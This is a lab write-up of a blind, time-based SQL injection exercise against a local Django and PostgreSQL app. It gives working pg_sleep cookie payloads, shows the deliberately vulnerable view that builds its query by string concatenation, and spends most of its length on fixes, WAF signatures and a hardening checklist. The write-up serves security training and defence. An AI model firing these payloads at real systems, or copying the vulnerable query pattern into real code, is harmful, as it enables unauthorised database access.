# Lab 14 — Blind SQL injection with time delays

## 1. Lab overview

| Field | Value |
| --- | --- |
| PortSwigger reference | <https://portswigger.net/web-security/sql-injection/blind/lab-time-delays> |
| Lab id | `psw-sqli-14-time-delays` |
| Vulnerability class | Blind SQL Injection — time-based (no in-band signal) |
| CWE | [CWE-89 — Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html) |
| Backend | PostgreSQL 16 (two-service Docker Compose) |
| Host URL | <http://127.0.0.1:18014/> |
| Flag | `FLAG{psw-sqli-14-time-delay-injection-confirmed}` |

### Objective

Every request carries a `TrackingId` cookie which the server looks up against the `tracked_users` analytics table. The row fetched is never rendered, and any SQL exception raised by the cursor is caught and discarded. Two requests with wildly different SQL bodies produce byte-identical HTML responses, so boolean-based blind techniques cannot distinguish them. The attacker's only observable lever is how long the server holds the connection before responding. The lab view measures its own query using `time.monotonic()` and releases the flag only when that measurement meets or exceeds ten seconds, forcing a true time-based out-of-band exploitation path.

---

## 2. Exploit walkthrough

The `TrackingId` cookie value is concatenated into a raw `SELECT` against `tracked_users` with no escaping and no binding. Because the response body is constant and exceptions are swallowed, the attacker must induce a delay *inside the database engine itself*. PostgreSQL exposes `pg_sleep(seconds)` for exactly this purpose.

**Step 1 — baseline request (benign)**

```http
GET / HTTP/1.1
Host: 127.0.0.1:18014
Cookie: TrackingId=psw-lab-visitor-001
```

The server executes:

```sql
SELECT tracking_id FROM tracked_users
WHERE tracking_id = 'psw-lab-visitor-001'
```

Round trip is sub-second. The rendered page reports `Last tracking lookup ran in 0.00s`.

**Step 2 — confirm the injection point with a syntactically broken payload**

```http
Cookie: TrackingId=x'
```

Executes:

```sql
SELECT tracking_id FROM tracked_users WHERE tracking_id = 'x''
```

This is a syntax error, but the view's bare `except Exception: pass` silently absorbs it. The HTML returned is identical to the baseline. At this point the attacker knows from the lab briefing that neither the response body nor the status code will ever differentiate success from failure.

**Step 3 — intended payload: trigger `pg_sleep(10)` inside the string literal**

```http
Cookie: TrackingId=x'||pg_sleep(10)::text||'
```

URL-decoded this yields the assembled query:

```sql
SELECT tracking_id FROM tracked_users
WHERE tracking_id = 'x'||pg_sleep(10)::text||''
```

`pg_sleep(10)` returns `void`; casting to `text` makes the `||` concatenation well-typed, so the whole `WHERE` predicate becomes `'x' || '' || ''` after the ten-second pause. PostgreSQL evaluates the call before comparing, so the server thread parks for ten seconds before returning an empty result set.

**Step 4 — server measures the delay and releases the flag**

The view records `duration = time.monotonic() - start`. On the next render, `duration >= 10.0` evaluates true, the flag row is fetched from the `flags` table, and the response embeds it in the `solved-banner`:

```
FLAG CAPTURED — the vulnerable TrackingId lookup was held for 10.02s by an injected time delay.
FLAG{psw-sqli-14-time-delay-injection-confirmed}
```

**Alternative variant — comment-terminated form**

```
TrackingId=x'||pg_sleep(10)-- -
```

This produces `WHERE tracking_id = 'x'||pg_sleep(10)-- -'`. The `||` against `void` ultimately errors, but only after `pg_sleep` has already parked the session, so the wall-clock measurement still crosses the threshold before the exception is swallowed.

---

## 3. Vulnerable code

### Endpoint: `GET /`

[shop/views.py:41-53](shop/views.py#L41-L53)

```python
def home(request: HttpRequest) -> HttpResponse:
    tracking_id = request.COOKIES.get("TrackingId")

    # Vulnerable lookup. Cookie goes straight into the SQL string. The
    # query result is never read back out; errors are swallowed. The
    # only observable server-side effect under attack is wall-clock
    # time.
    duration = 0.0
    if tracking_id is not None:
        query = (
            "SELECT tracking_id FROM tracked_users "
            "WHERE tracking_id = '" + tracking_id + "'"
        )
```

The cookie is pulled from the request, wrapped in literal single quotes, and concatenated into a SQL string. Neither `cursor.execute` binding nor any escaping is performed, so every byte of the cookie is interpreted as SQL syntax.

[shop/views.py:54-61](shop/views.py#L54-L61)

```python
        start = time.monotonic()
        try:
            with connection.cursor() as cursor:
                cursor.execute(query)
                cursor.fetchall()
        except Exception:
            pass
        duration = time.monotonic() - start
```

Three independent defects compound here:

1. `cursor.execute(query)` is called with a single pre-built string — the driver has no way to separate code from data.
2. `except Exception: pass` swallows every DB error. Errors that would otherwise reveal the injection (and alert monitoring) vanish. This is what turns the bug from "error-based" into "blind".
3. `time.monotonic()` bracketing intentionally exposes wall-clock duration as an oracle — exactly the side channel a time-based exploit needs.

[shop/views.py:63-68](shop/views.py#L63-L68)

```python
    solved = duration >= SOLVE_THRESHOLD_SECONDS
    flag = None
    if solved:
        flag_row = Flag.objects.first()
        if flag_row is not None:
            flag = flag_row.content
```

The solve gate is purely duration-based — the contents of `tracked_users` are never consulted. Any payload that parks the cursor long enough wins.

### Supporting model

[shop/models.py:4-18](shop/models.py#L4-L18) — the `TrackedUser` model exists only so the injected statement has a real relation to read from; its rows are never rendered.

### Seeded data

[shop/management/commands/seed.py:27-32](shop/management/commands/seed.py#L27-L32) — one tracked_users row and one flags row. The flag is decoupled from the vulnerable table on purpose; the injection proves capability, and the fixed prize is handed out on timing alone.

### Backend choice

[sqli_lab/settings.py:54-63](sqli_lab/settings.py#L54-L63) configures the PostgreSQL driver. [docker-compose.yml:4-23](docker-compose.yml#L4-L23) runs `postgres:16-alpine` on an internal Docker network. PostgreSQL is required because the exploit depends on `pg_sleep()`; SQLite has no native sleep primitive.

---

## 4. Why the vulnerability exists

| Root cause | Effect |
| --- | --- |
| **String concatenation of untrusted cookie into SQL** | Attacker-controlled bytes become SQL syntax; the `||`, `pg_sleep`, and comment tokens all parse as code. |
| **Blanket `except Exception: pass` around the cursor** | Parse errors, type errors, and constraint errors are all silenced — the attacker gets a clean oracle with no stack traces polluting the signal. |
| **Server-side timing gate exposed to the client** | The duration itself is the oracle. A single request can be held arbitrarily long by the injected payload. |
| **No statement timeout at the DB level** | PostgreSQL happily holds a connection for ten seconds (or ten minutes) inside `pg_sleep`. Nothing on the data tier interrupts the sleep. |
| **No query-type allow-list** | The tracked_users lookup is a single-table `SELECT` by equality — a pattern that should never need free-form cookie content in its `WHERE` clause. |

---

## 5. Code-level mitigation

### 5.1 Parameterise the lookup

Binding the cookie as a parameter removes every syntactic lever the attacker has. `pg_sleep(10)` becomes an ordinary string matched literally against the `tracking_id` column — it never executes.

```python
# shop/views.py — fixed
def home(request: HttpRequest) -> HttpResponse:
    tracking_id = request.COOKIES.get("TrackingId")

    duration = 0.0
    if tracking_id is not None:
        query = (
            "SELECT tracking_id FROM tracked_users "
            "WHERE tracking_id = %s"
        )
        start = time.monotonic()
        with connection.cursor() as cursor:
            cursor.execute(query, [tracking_id])   # bound as data
            cursor.fetchall()
        duration = time.monotonic() - start
```

### 5.2 Prefer the ORM for a trivial equality lookup

There is no reason this query is hand-written. The ORM always parameterises, and the intent is clearer:

```python
from .models import TrackedUser

TrackedUser.objects.filter(tracking_id=tracking_id).exists()
```

### 5.3 Constrain the cookie format before querying

`TrackingId` is a server-issued opaque token. Apply a strict regex before touching the database:

```python
import re

_TRACKING_ID_RE = re.compile(r"\A[A-Za-z0-9\-]{1,64}\Z")

tracking_id = request.COOKIES.get("TrackingId", "")
if not _TRACKING_ID_RE.fullmatch(tracking_id):
    tracking_id = None          # treat as anonymous visitor
```

Validation is defense-in-depth on top of parameterisation: attackers with a novel injection primitive never reach the cursor.

### 5.4 Sign or encrypt the cookie

Because the tracking id is generated by the server, it can be HMAC-signed (`django.core.signing.Signer`) or stored in the session rather than a plain cookie. Any cookie that fails signature verification is discarded. An unsigned value supplied from outside is never an acceptable input to the query.

### 5.5 Stop swallowing database exceptions

The bare `except Exception: pass` is independently harmful. Let errors surface to the logging pipeline:

```python
import logging
log = logging.getLogger(__name__)

try:
    with connection.cursor() as cursor:
        cursor.execute(query, [tracking_id])
        cursor.fetchall()
except Exception:
    log.exception("tracked_users lookup failed")
    # optionally: return a generic 500 to the client
```

In production, a spike of `psycopg.errors.SyntaxError` on the `home` view is a direct injection tripwire. Hiding it is what makes the blind exploit tractable.

### 5.6 Do not expose server-measured query duration

Never surface the measured query duration to the client — not even rounded, not even in a "debug" banner. Any monotonic timing reflected to the attacker is a direct oracle. Budget thresholds, retry counters, and timing metrics belong on the server's internal telemetry only.

---

## 6. Network / infrastructure-level mitigation

### 6.1 PostgreSQL `statement_timeout`

The single most effective DB-tier control is a short statement timeout on the application role. Set it in `postgresql.conf` or on the role itself:

```sql
ALTER ROLE labuser SET statement_timeout = '2s';
```

With a two-second ceiling, `pg_sleep(10)` is cancelled by the server before it can influence the response, and the view's wall-clock measurement never clears the solve threshold. Pair this with `idle_in_transaction_session_timeout` and `lock_timeout` for a full timing budget.

### 6.2 Connection-pool timeout at the app tier

Django's `OPTIONS = {"options": "-c statement_timeout=2000"}` (psycopg) lets the app assert a per-connection timeout at session start, in case the DB role setting is ever relaxed. A pgBouncer layer between app and DB can also enforce its own timeout.

### 6.3 Web Application Firewall (WAF)

A WAF in front of the lab, with the OWASP Core Rule Set, covers the signatures an attacker would actually send:

- `REQUEST-942` — SQL injection detection (matches `pg_sleep`, `WAITFOR DELAY`, `BENCHMARK(`, `SLEEP(`, `||`, `-- `).
- Custom rule: reject `Cookie: TrackingId=` values that do not match the allow-list regex `^[A-Za-z0-9\-]{1,64}$`.
- Custom rule: alert on any request where `server-timing` or measured upstream latency exceeds a request-duration anomaly threshold (e.g. >5s on an endpoint whose P99 is <200ms). Modern WAFs (AWS WAF, Cloudflare, NGINX App Protect) support duration-based rules.

A WAF is not a substitute for fixing the cursor call; determined attackers obfuscate payloads. Treat it as a signal layer.

### 6.4 Least-privilege database role

The `labuser` role should be scoped to exactly what the app needs:

- `SELECT` on `tracked_users` and `flags` only.
- Revoke `EXECUTE` on `pg_sleep`, `pg_stat_*`, and other diagnostic functions the app never calls: `REVOKE EXECUTE ON FUNCTION pg_sleep(double precision) FROM labuser;`
- No `CREATE`, no `COPY`, no access to `pg_shadow`/`pg_authid`.
- No network access to hosts outside the DB tier.

Removing `EXECUTE` on `pg_sleep` alone renders the intended payload inert: the query fails at planning time instead of blocking the session.

### 6.5 Network segmentation

The compose file already puts the DB on a private bridge `psw-sqli-14-time-delays-net` ([docker-compose.yml:51-54](docker-compose.yml#L51-L54)) and binds the web service to loopback only ([docker-compose.yml:33-34](docker-compose.yml#L33-L34)). In production, the DB container should also have no egress — no DNS, no outbound HTTP — so that a future chained exploit cannot exfiltrate data via `COPY PROGRAM` or DNS tunneling.

### 6.6 Monitoring & rate limiting

- Alert on query durations at or above the statement timeout; a real user never triggers these.
- Alert on cookie values that fail the validation regex.
- Rate-limit `/` per client IP to kneecap the automated row-at-a-time timing attacks that time-based SQLi is typically chained into.
- Emit structured logs of every caught DB exception with the failing query shape (never the raw parameter value — that itself is the injection).

---

## 7. Defense-in-depth checklist

- [ ] All `cursor.execute` calls take parameters as the second argument (no `+`, `%`, or f-string assembly).
- [ ] ORM used for straightforward equality lookups; raw SQL only when justified and reviewed.
- [ ] Opaque server-issued identifiers (tracking ids, session ids) are signed and format-validated before reaching the query layer.
- [ ] `statement_timeout` set on the application DB role, enforced at session start via connection options.
- [ ] `EXECUTE` on `pg_sleep` and other delay primitives revoked from the application role.
- [ ] DB exceptions are logged, never swallowed; error rate on vulnerable endpoints is alerted.
- [ ] Server-measured durations are never reflected to the client — no `duration=` fields, no `Server-Timing` headers in production.
- [ ] WAF in front of the app with SQLi signatures and per-endpoint request-duration anomaly rules.
- [ ] DB container on a private network with no egress; web tier bound to loopback or behind a reverse proxy.
- [ ] SAST rules (`bandit`, `semgrep`) block `cursor.execute("..." + x)` and `except Exception: pass` around DB calls.

---

## 8. References

- PortSwigger Web Security Academy — [Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
- PortSwigger — [SQL injection cheat sheet — time-delay payloads](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- OWASP — [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- PostgreSQL docs — [`pg_sleep` and delay functions](https://www.postgresql.org/docs/current/functions-datetime.html#FUNCTIONS-DATETIME-DELAY)
- PostgreSQL docs — [`statement_timeout` parameter](https://www.postgresql.org/docs/current/runtime-config-client.html#GUC-STATEMENT-TIMEOUT)
- CWE-89 — <https://cwe.mitre.org/data/definitions/89.html>
- Django docs — [Executing custom SQL directly](https://docs.djangoproject.com/en/5.0/topics/db/sql/#executing-custom-sql-directly)
- OWASP CRS — <https://coreruleset.org/>
